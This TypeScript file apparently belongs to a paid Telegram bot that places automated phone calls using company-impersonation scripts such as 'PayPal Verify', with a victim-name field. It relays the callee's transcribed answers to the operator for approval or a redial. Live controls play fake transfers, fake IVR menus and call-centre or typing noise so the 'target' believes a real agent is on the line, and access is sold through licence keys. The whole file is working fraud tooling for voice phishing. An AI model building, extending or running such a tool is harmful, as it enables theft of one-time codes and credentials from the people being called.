  b.action('script_cats', async (ctx) => {
    await ctx.answerCbQuery();
    await gateAction(ctx, async () => {
      await editOrSend(ctx, b, buildScriptCatMenu(), { reply_markup: scriptCatKeyboard() } as any);
    });
  });

  // Browse scripts in a category with pagination
  b.action(/^script_cat:([^:]+):(\d+)$/, async (ctx) => {
    await ctx.answerCbQuery();
    await gateAction(ctx, async () => {
      const cat  = ctx.match[1] as ScriptCategory;
      const page = parseInt(ctx.match[2] ?? '0', 10);
      await editOrSend(ctx, b, buildScriptListMsg(cat, page), {
        reply_markup: scriptListKeyboard(cat, page, ctx.chat?.id ?? 0),
      } as any);
    });
  });

  // Preview a built-in script (show full message)
  b.action(/^script_preview:(.+)$/, async (ctx) => {
    await ctx.answerCbQuery();
    await gateAction(ctx, async () => {
      const scriptId = ctx.match[1]!;
      const s = getScript(scriptId);
      if (!s) { await ctx.answerCbQuery('Script not found', { show_alert: true }); return; }
      const m = new Msg()
        .emoji(E.STAR).sp().bi(s.name).nl(2)
        .emoji(E.GLOBE).plain(' Company: ').bold(s.company).plain(` [${s.country}]`).nl()
        .emoji(E.ROBOT).plain(' Voice:   ').bold(getVoice(s.voice).label + ' ' + getVoice(s.voice).flag).nl(2)
        .blockquote(s.message).nl(2)
        .italic('Gather message:').nl()
        .blockquote(s.gather);
      await editOrSend(ctx, b, m, {
        reply_markup: {
          inline_keyboard: [
            [btn.green('Use This Script', `script_use:${s.id}`, E.CHECK)],
            [btn.blue('Back', `script_cat:${s.category}:0`, E.CANCEL)],
          ],
        },
      } as any);
    });
  });

  // Activate a script
  b.action(/^script_use:(.+)$/, async (ctx) => {
    const chatId   = ctx.chat?.id ?? 0;
    const scriptId = ctx.match[1]!;
    const s        = getScript(scriptId);
    const name     = s?.name ?? getUserScripts(chatId).find(x => x.id === scriptId)?.name ?? scriptId;
    if (!s && !getUserScripts(chatId).find(x => x.id === scriptId)) {
      await ctx.answerCbQuery('Script not found.', { show_alert: true });
      return;
    }
    setActiveScript(chatId, scriptId);
    await ctx.answerCbQuery(`✅ Script activated: ${name}`, { show_alert: true });
  });

  // New custom script button
  b.action('script_new', async (ctx) => {
    await ctx.answerCbQuery();
    await gateAction(ctx, async () => {
      scriptPending.set(ctx.chat!.id, { step: 'name' });
      const m = new Msg()
        .emoji(E.TOOLS).sp().bold('New Custom Script').nl(2)
        .italic('Step 1 of 2 — send the script name (e.g. "PayPal Verify"):');
      await editOrSend(ctx, b, m);
    });
  });

  // My custom scripts via button
  b.action('script_my', async (ctx) => {
    await ctx.answerCbQuery();
    await gateAction(ctx, async () => {
      const chatId = ctx.chat!.id;
      const list   = getUserScripts(chatId);
      const active = getActiveScript(chatId);
      const m      = new Msg().emoji(E.STAR).sp().bi('My Custom Scripts').nl(2);
      if (list.length === 0) {
        m.italic('No custom scripts yet.').nl(2).emoji(E.TOOLS).plain(' Use /newscript to create one.');
      } else {
        for (const s of list) {
          const tick = s.id === active ? ' ✅' : '';
          m.emoji(E.CHECK).plain(' ').bold(s.name + tick).nl()
           .plain('  ').italic(s.message.slice(0, 80) + (s.message.length > 80 ? '…' : '')).nl();
        }
      }
      const rows: any[][] = (list.map(s => [
        btn.blue(s.name, `script_use:${s.id}`, E.CHECK),
        btn.red('Del', `script_del_confirm:${s.id}`, E.CANCEL),
      ]) as any[][]);
      rows.push([btn.green('New Script', 'script_new', E.TOOLS), btn.blue('Browse All', 'script_cats', E.ROCKET)]);
      await editOrSend(ctx, b, m, { reply_markup: { inline_keyboard: rows } } as any);
    });
  });

  // Edit script (from button)
  b.action(/^script_edit:(.+)$/, async (ctx) => {
    await ctx.answerCbQuery();
    await gateAction(ctx, async () => {
      const scriptId = ctx.match[1]!;
      const chatId   = ctx.chat!.id;
      const s = getUserScripts(chatId).find(x => x.id === scriptId);
      if (!s) { await ctx.answerCbQuery('Not found', { show_alert: true }); return; }
      scriptPending.set(chatId, { step: 'name', editId: scriptId });
      const m = new Msg()
        .emoji(E.TOOLS).sp().bold(`Editing: ${s.name}`).nl(2)
        .italic('Send the new name (or the same name to keep it):');
      await editOrSend(ctx, b, m);
    });
  });

  // Delete script confirm
  b.action(/^script_del_confirm:(.+)$/, async (ctx) => {
    await ctx.answerCbQuery();
    await gateAction(ctx, async () => {
      const scriptId = ctx.match[1]!;
      const chatId   = ctx.chat!.id;
      const s = getUserScripts(chatId).find(x => x.id === scriptId);
      if (!s) { await ctx.answerCbQuery('Not found', { show_alert: true }); return; }
      await editOrSend(ctx, b,
        new Msg().emoji(E.RED).sp().bold(`Delete "${s.name}"?`).nl(2).italic('This cannot be undone.'), {
          reply_markup: {
            inline_keyboard: [
              [btn.red('Yes, Delete', `script_del_do:${scriptId}`, E.CANCEL), btn.blue('Cancel', 'script_my', E.CHECK)],
            ],
          },
        } as any);
    });
  });

  // Delete script execute
  b.action(/^script_del_do:(.+)$/, async (ctx) => {
    await ctx.answerCbQuery();
    await gateAction(ctx, async () => {
      const scriptId = ctx.match[1]!;
      const chatId   = ctx.chat!.id;
      const ok = deleteUserScript(chatId, scriptId);
      if (ok && getActiveScript(chatId) === scriptId) clearActiveScript(chatId);
      const m = ok
        ? new Msg().emoji(E.CHECK).sp().bold('Script deleted.')
        : new Msg().emoji(E.CROSS).sp().plain('Script not found.');
      await editOrSend(ctx, b, m, {
        reply_markup: { inline_keyboard: [[btn.blue('Back', 'script_my', E.ROCKET)]] },
      } as any);
    });
  });

  // ── Voice actions ─────────────────────────────────────────────────────────────

  // Preview voice (send TTS audio to user)
  b.action(/^voice_preview:(.+)$/, async (ctx) => {
    const voiceId = ctx.match[1]!;
    const chatId  = ctx.chat?.id ?? 0;
    await ctx.answerCbQuery('Generating voice preview…');
    await gateAction(ctx, async () => {
      const v = getVoice(voiceId);
      try {
        // Use google-tts-api for instant preview (no auth required)
        const googleTTS = await import('google-tts-api');
        const getText   = (googleTTS as any).default?.getAudioBase64 ?? googleTTS.getAudioBase64;
        const base64    = await getText(v.sample.slice(0, 200), { lang: 'en', slow: false });
        const buf       = Buffer.from(base64, 'base64');
        await b.telegram.sendVoice(chatId, { source: buf }, {
          caption: `🎙 ${v.flag} ${v.label} — ${v.accent}\n\nNote: this is a Google TTS preview. The actual call uses Amazon Polly.`,
        } as any);
      } catch (err) {
        logger.warn({ err }, 'voice preview TTS failed');
        // Fallback: send a description
        const m = new Msg()
          .emoji(E.STAR).sp().bi(`${v.flag} ${v.label} — ${v.accent}`).nl(2)
          .italic('Voice sample text:').nl()
          .blockquote(v.sample).nl(2)
          .emoji(E.TOOLS).plain(' Audio preview unavailable — voice preview requires an internet connection.');
        await b.telegram.sendMessage(chatId, m.build().text, { entities: m.build().entities as any });
      }
    });
  });

  // Activate a voice
  b.action(/^voice_use:(.+)$/, async (ctx) => {
    const voiceId = ctx.match[1]!;
    const chatId  = ctx.chat?.id ?? 0;
    setUserVoice(chatId, voiceId);
    const v = getVoice(voiceId);
    await ctx.answerCbQuery(`✅ Voice set: ${v.flag} ${v.label} — ${v.accent}`, { show_alert: true });
    await editOrSend(ctx, b, buildVoiceMenu(chatId), { reply_markup: voiceKeyboard(voiceId) } as any);
  });

  // Voice menu shortcut ─────────────────────────────────────────────────────────
  b.action('voice_menu', async (ctx) => {
    await ctx.answerCbQuery();
    await gateAction(ctx, async () => {
      const chatId = ctx.chat!.id;
      const cur    = getUserVoice(chatId);
      await editOrSend(ctx, b, buildVoiceMenu(chatId), { reply_markup: voiceKeyboard(cur) } as any);
    });
  });

  // Hang up now button ───────────────────────────────────────────────────────────
  b.action('hangup_now', async (ctx) => {
    await ctx.answerCbQuery();
    const chatId  = ctx.chat?.id ?? 0;
    const session = getByChat(chatId);
    if (session?.callSid) {
      try { await hangupCall(session.callSid); } catch { /* ignore */ }
      clearSession(chatId);
      const m = new Msg().emoji(E.CANCEL).sp().bold('Call ended.').nl().italic('Session cleared.');
      await editOrSend(ctx, b, m);
    } else {
      await ctx.answerCbQuery('No active call to hang up.', { show_alert: true });
    }
  });

  // Recall confirm / cancel ─────────────────────────────────────────────────────
  b.action('recall_confirm', async (ctx) => {
    await ctx.answerCbQuery();
    await gateAction(ctx, async () => {
      const chatId = ctx.chat!.id;
      const recall = lastCallMap.get(chatId);
      if (!recall) {
        await ctx.answerCbQuery('No previous call found.', { show_alert: true });
        return;
      }
      const flow: FlowState = {
        callCount: 6,
        deviceName: recall.mode,
        VN: recall.VN,
        UN: recall.UN,
        BN: recall.BN,
        vicName: recall.vicName,
        LD: recall.LD,
        scriptId: recall.scriptId,
        voiceId: recall.voiceId,
        callMode: 'speech',
      };
      if (recall.scriptId) setActiveScript(chatId, recall.scriptId);
      if (recall.voiceId)  setUserVoice(chatId, recall.voiceId);
      await editOrSend(ctx, b, new Msg()
        .emoji(E.PHONE).sp().bold('Recalling last call…').nl()
        .emoji(E.CHECK).sp().italic(`Dialling ${recall.VN} again…`));
      await placeCallNow(b, chatId, flow);
    });
  });

  b.action('recall_cancel', async (ctx) => {
    await ctx.answerCbQuery();
    await editOrSend(ctx, b, new Msg().emoji(E.CANCEL).sp().bold('Recall cancelled.'));
  });

  // ── Individual IVR button handlers ─────────────────────────────────────────

  const ivrBack: any[] = [btn.blue('← Back to DPGP Panel', 'IVR-content', E.TOOLS)];

  b.action('ivr_hangup', async (ctx) => {
    await ctx.answerCbQuery();
    await gateAction(ctx, async () => {
      const chatId = ctx.chat?.id ?? 0;
      const session = getByChat(chatId);
      if (session?.callSid) {
        try { await hangupCall(session.callSid); clearSession(chatId); } catch { /* ignore */ }
        const m = new Msg()
          .emoji(E.CANCEL).sp().bold('Call Ended').nl(2)
          .emoji(E.CHECK).sp().italic('Hangup successful — call has been terminated.');
        await editOrSend(ctx, b, m, { reply_markup: { inline_keyboard: [ivrBack] } });
      } else {
        await ctx.answerCbQuery('No active call to hang up.', { show_alert: true });
      }
    });
  });

  b.action('ivr_hold', async (ctx) => {
    await ctx.answerCbQuery('🎵 Hold music activated');
    await gateAction(ctx, async () => {
      const chatId  = ctx.chat?.id ?? 0;
      const session = getByChat(chatId);
      if (session?.callSid) {
        try { await holdCall(session.callSid, `${webhookBase()}/hold`); } catch { /* ignore */ }
      }
      const m = new Msg()
        .emoji(E.CHECK).sp().bold('Call Placed on Hold').nl(2)
        .emoji(E.ANNOUNCE).sp().italic('Target is now hearing hold music.')
        .nl().emoji(E.STAR).sp().italic('Click "Remove from hold" when ready to resume.');
      await editOrSend(ctx, b, m, {
        reply_markup: { inline_keyboard: [
          [btn.green('Remove from hold', 'ivr_unhold', E.CANCEL)],
          ivrBack,
        ]},
      });
    });
  });

  b.action('ivr_unhold', async (ctx) => {
    await ctx.answerCbQuery('Call resumed');
    await gateAction(ctx, async () => {
      const chatId  = ctx.chat?.id ?? 0;
      const session = getByChat(chatId);
      if (session?.callSid) {
        try { await resumeCall(session.callSid, `${webhookBase()}/voice`); } catch { /* ignore */ }
      }
      const m = new Msg()
        .emoji(E.CHECK).sp().bold('Call Removed from Hold').nl(2)
        .emoji(E.PHONE).sp().italic('Target is back on the live call.');
      await editOrSend(ctx, b, m, { reply_markup: { inline_keyboard: [ivrBack] } });
    });
  });

  b.action('ivr_fake_xfer', async (ctx) => {
    await ctx.answerCbQuery('📞 Playing transfer ringtone…');
    await gateAction(ctx, async () => {
      const chatId  = ctx.chat?.id ?? 0;
      const session = getByChat(chatId);
      if (session?.callSid) {
        try { await holdCall(session.callSid, `${webhookBase()}/transfer`); } catch { /* ignore */ }
      }
      const m = new Msg()
        .emoji(E.GLOBE).sp().bold('Fake Transfer Initiated').nl(2)
        .emoji(E.ANNOUNCE).sp().italic('Target is hearing a transfer ringtone.')
        .nl().emoji(E.STAR).sp().italic('Auto-redirects back to live call after ringtone.');
      await editOrSend(ctx, b, m, { reply_markup: { inline_keyboard: [ivrBack] } });
    });
  });

  b.action('ivr_real_xfer', async (ctx) => {
    await ctx.answerCbQuery('Transferring to IVR…');
    await gateAction(ctx, async () => {
      const chatId  = ctx.chat?.id ?? 0;
      const session = getByChat(chatId);
      if (session?.callSid) {
        try { await holdCall(session.callSid, `${webhookBase()}/fake-ivr`); } catch { /* ignore */ }
      }
      const m = new Msg()
        .emoji(E.ROCKET).sp().bold('Transferred to IVR System').nl(2)
        .emoji(E.TOOLS).sp().italic('Target is hearing the automated IVR menu.')
        .nl().emoji(E.CHECK).sp().italic('"For English press 1, for billing press 2…"');
      await editOrSend(ctx, b, m, { reply_markup: { inline_keyboard: [ivrBack] } });
    });
  });

  b.action('ivr_fake_prompt', async (ctx) => {
    await ctx.answerCbQuery('🔊 Playing fake IVR prompt…');
    await gateAction(ctx, async () => {
      const chatId  = ctx.chat?.id ?? 0;
      const session = getByChat(chatId);
      if (session?.callSid) {
        try { await holdCall(session.callSid, `${webhookBase()}/fake-ivr`); } catch { /* ignore */ }
      }
      const m = new Msg()
        .emoji(E.STAR).sp().bold('Fake IVR Prompt Playing').nl(2)
        .emoji(E.ANNOUNCE).sp().italic('Target is hearing a simulated automated IVR system.')
        .nl().emoji(E.ROBOT).sp().italic('"For English, press 1. For account info, press 2."');
      await editOrSend(ctx, b, m, { reply_markup: { inline_keyboard: [ivrBack] } });
    });
  });

  b.action('ivr_bg_audio', async (ctx) => {
    await ctx.answerCbQuery('🎙 Call center background audio started');
    await gateAction(ctx, async () => {
      const chatId  = ctx.chat?.id ?? 0;
      const session = getByChat(chatId);
      if (session?.callSid) {
        try { await holdCall(session.callSid, `${webhookBase()}/bg-audio`); } catch { /* ignore */ }
      }
      const m = new Msg()
        .emoji(E.ANNOUNCE).sp().bold('Background Audio Active').nl(2)
        .emoji(E.CHECK).sp().italic('Target hears realistic call center ambience.')
        .nl().emoji(E.STAR).sp().italic('Loops until next IVR action is pressed.');
      await editOrSend(ctx, b, m, { reply_markup: { inline_keyboard: [ivrBack] } });
    });
  });

  b.action('ivr_typing_audio', async (ctx) => {
    await ctx.answerCbQuery('⌨️ Typing audio activated');
    await gateAction(ctx, async () => {
      const chatId  = ctx.chat?.id ?? 0;
      const session = getByChat(chatId);
      if (session?.callSid) {
        // Redirect call to bg-audio (closest to typing ambience with current assets)
        try { await holdCall(session.callSid, `${webhookBase()}/bg-audio`); } catch { /* ignore */ }
      }
      const m = new Msg()
        .emoji(E.TOOLS).sp().bold('Typing Audio Active').nl(2)
        .emoji(E.CHECK).sp().italic('Target hears keyboard and call-centre sounds.')
        .nl().emoji(E.STAR).sp().italic('Simulates an agent entering data on their system.');
      await editOrSend(ctx, b, m, { reply_markup: { inline_keyboard: [ivrBack] } });
    });
  });

  // ── Twilio call decision buttons ──────────────────────────────────────────────
  b.action(/^approve:(.+)$/, async (ctx) => {
    const callSid = ctx.match[1];
    if (!callSid) return;
    try { await hangupCall(callSid); } catch (err) { logger.warn({ err }, 'hangupCall on approve'); }
    clearSession(ctx.chat?.id ?? 0);
    await ctx.answerCbQuery(`${E.CHECK.char} Approved`);
    const m = new Msg()
      .emoji(E.CHECK).sp().bold('Approved.').nl()
      .italic('Call ended. Session closed.');
    await editOrSend(ctx, b, m);
  });

  b.action(/^deny:(.+)$/, async (ctx) => {
    const callSid = ctx.match[1];
    if (!callSid) return;
    const chatId  = ctx.chat?.id ?? 0;
    const session = getByCall(callSid);
    try { await hangupCall(callSid); } catch (err) { logger.warn({ err }, 'hangupCall on deny'); }
    await ctx.answerCbQuery(`${E.CANCEL.char} Denied — calling again…`);

    const m1 = new Msg().emoji(E.CANCEL).sp().bold('Denied.').sp().italic('Calling again…');
    await editOrSend(ctx, b, m1);

    if (session) {
      try {
        const voiceUrl = `${webhookBase()}/voice`;
        const newSid   = await makeCall(session.phone, voiceUrl);
        const scriptId = session.scriptId;
        clearSession(chatId);
        createSession(chatId, session.phone, newSid, scriptId);
        logCall({ chatId, mode: 'RETRY', phone: session.phone, callSid: newSid, status: 'initiated', ts: Date.now() });
        const m2 = new Msg().emoji(E.PHONE).sp().bold(`Calling ${session.phone} again…`);
        const { text, entities } = m2.build();
        b.telegram.sendMessage(chatId, text, { entities: entities as any });
      } catch (err) {
        logger.error({ err }, 'makeCall failed on deny retry');
        const m3 = new Msg().emoji(E.CROSS).sp().plain('Retry failed. Use /call to try again.');
        const { text, entities } = m3.build();
        b.telegram.sendMessage(chatId, text, { entities: entities as any });
      }
    }
  });
}

// ══════════════════════════════════════════════════════════════════════════════
// Startup — load DB state, register handlers, launch
// ══════════════════════════════════════════════════════════════════════════════

export async function startBot(): Promise<void> {
  // ── Token resolution: DB override > env var ─────────────────────────────────
  let token = process.env['BOT_TOKEN'] ?? process.env['TELEGRAM_BOT_TOKEN'];

  // Load persisted state (no-op if no DATABASE_URL)
  try {
    const [dbUsers, dbBanned, dbLicenses, maintenanceSetting, tokenOverride] = await Promise.all([
      dbLoadAllUsers(),
      dbLoadBanned(),
      dbLoadAllLicenses(),
      dbGetSetting('maintenance'),
      dbGetSetting('bot_token_override'),
    ]);

    if (tokenOverride && tokenOverride !== token) {
      logger.info('Using bot token from DB override');
      token = tokenOverride;
    }
    for (const u of dbUsers) touchUser(u.chatId, u.username);
    for (const id of dbBanned) banUser(id);
    for (const l of dbLicenses) hydrateLicense(l);
    if (maintenanceSetting === '1') maintenanceMode = true;
    logger.info({ users: dbUsers.length, licenses: dbLicenses.length }, 'DB state loaded');
  } catch (e) {
    logger.warn({ e }, 'DB load skipped — running in-memory only');
  }

  if (!token) {
    logger.warn('TELEGRAM_BOT_TOKEN not set — Telegram bot disabled');
    return;
  }

  bot = new Telegraf(token);

  // ── Global middleware ───────────────────────────────────────────────────────

  // Track all users
  bot.use((ctx, next) => {
    if (ctx.chat?.id) {
      touchUser(ctx.chat.id, (ctx.from as any)?.username);
      const u = { chatId: ctx.chat.id, username: (ctx.from as any)?.username, firstSeen: Date.now(), lastSeen: Date.now() };
      dbUpsertUser(u);
    }
    return next();
  });

  // Ban enforcement
  bot.use(async (ctx, next) => {
    const userId = ctx.from?.id;
    if (userId && isBanned(userId) && !isAdmin(userId)) {
      try {
        await ctx.reply(`${E.RED.char} You have been banned from using this bot. Contact ${OWNER_HANDLE} to appeal.`);
      } catch { /* ignore */ }
      return;
    }
    return next();
  });

  // Maintenance mode
  bot.use(async (ctx, next) => {
    if (!maintenanceMode) return next();
    const userId = ctx.from?.id;
    if (isAdmin(userId)) return next();
    // Allow answerCbQuery to pass through so buttons don't hang
    if ('callback_query' in (ctx.update ?? {})) {
      try { await (ctx as any).answerCbQuery(`${E.TOOLS.char} Bot is under maintenance. Please wait.`, { show_alert: true }); } catch { /* ignore */ }
      return;
    }
    try {
      await ctx.reply(`${E.TOOLS.char} Bot is currently under maintenance. Please try again later.\n\n${E.DIAMOND.char} Contact: ${OWNER_HANDLE}`);
    } catch { /* ignore */ }
  });

  registerCommands(bot);
  registerMessageHandler(bot);
  registerActions(bot);

  // Catch ALL unhandled errors — keeps polling alive instead of crashing
  bot.catch((err: unknown, ctx: any) => {
    const action = ctx?.callbackQuery?.data ?? ctx?.message?.text ?? 'unknown';
    logger.error({ err, action }, 'Bot handler error (recovered)');
    try { ctx?.answerCbQuery?.('Something went wrong — try again.', { show_alert: true }); } catch { /* ignore */ }
  });

  logger.info('Telegram bot launching (long polling)…');
  bot.launch()
    .catch((err) => logger.error({ err }, 'Telegram bot launch error'));

  // Sweep stale sessions every 15 minutes (TTL = 2 hours)
  setInterval(() => {
    const cleared = sweepStaleSessions();
    if (cleared > 0) logger.info({ cleared }, 'Swept stale call sessions');
  }, 15 * 60_000);

  // Sweep expired licenses every minute
  setInterval(() => {
    sweepExpired((userId) => {
      if (!bot) return;
      // Persist the expiry flags so sweep is idempotent across restarts
      const expiredLic = getUserLicense(userId);
      if (expiredLic) dbUpsertLicense({ ...expiredLic, active: false, notifiedExpiry: true });
      const m = new Msg()
        .emoji(E.CANCEL).sp().bi('License Expired').nl(2)
        .emoji(E.WARNING).sp().italic("Your license has ended — you can't use premium features anymore.").nl(2)
        .emoji(E.KEY).sp().bold('Buy a new license key').plain(' with /subscribe, then activate it with /redeem.');
      const { text, entities } = m.build();
      bot.telegram.sendMessage(userId, text, {
        entities: entities as any,
        reply_markup: { inline_keyboard: [[btn.gold('See Plans', 'subscription', E.CROWN)]] },
      } as any).catch(() => { /* user may have blocked */ });
    });
  }, 60_000);

  process.once('SIGINT',  () => bot?.stop('SIGINT'));
  process.once('SIGTERM', () => bot?.stop('SIGTERM'));
}

/**
 * Send callee transcription to Telegram user with APPROVE / DENY buttons.
 * Called from the Twilio /gather webhook route.
 */
export async function notifyUser(
  chatId: number, transcription: string, callSid: string,
): Promise<void> {
  if (!bot) {
    logger.warn({ chatId, callSid }, 'notifyUser called before bot was initialised — dropping notification');
    return;
  }

  const m = new Msg()
    .emoji(E.ANNOUNCE).sp().bi('Callee responded:').nl(2)
    .blockquote(`"${transcription}"`).nl(2)
    .emoji(E.STAR).sp().bold('Approve to end call · Deny to call again').nl(2)
    .emoji(E.TOOLS).sp().italic('Live controls still active below ↓');
  const { text, entities } = m.build();

  await bot.telegram.sendMessage(chatId, text, {
    entities: entities as any,
    reply_markup: {
      inline_keyboard: [
        [
          btn.green('APPROVE', `approve:${callSid}`, E.CHECK),
          btn.red('DENY',      `deny:${callSid}`,    E.CROSS),
        ],
        [btn.red('Hang Up',       'hangup_now',       E.CANCEL),
         btn.blue('Hold',         'ivr_hold',         E.ANNOUNCE)],
        [btn.teal('Fake Transfer','ivr_fake_xfer',    E.PHONE),
         btn.teal('Fake IVR',     'ivr_real_xfer',    E.ROBOT)],
        [btn.blue('BG Audio',     'ivr_bg_audio',     E.STAR),
         btn.blue('Typing Audio', 'ivr_typing_audio', E.TOOLS)],
      ],
    },
  } as any);
}

/**
 * Send a call recording link to the Telegram user.
 * Called from the /recording webhook after SignalWire finishes recording.
 */
export async function notifyCallRecording(
  chatId: number, recordingUrl: string, duration: string,
): Promise<void> {
  if (!bot) return;
  const secs = parseInt(duration, 10) || 0;
  const mins  = Math.floor(secs / 60);
  const rem   = secs % 60;
  const dur   = mins > 0 ? `${mins}m ${rem}s` : `${secs}s`;
  const m = new Msg()
    .emoji(E.ANNOUNCE).sp().bi('Call Recording Ready').nl(2)
    .emoji(E.PHONE).plain(' Duration: ').bold(dur).nl(2)
    .italic('Tap the button below to download the recording:');
  const { text, entities } = m.build();
  await bot.telegram.sendMessage(chatId, text, {
    entities: entities as any,
    reply_markup: {
      inline_keyboard: [[
        { text: '⬇️ Download Recording', url: recordingUrl },
      ]],
    },
  } as any);
}
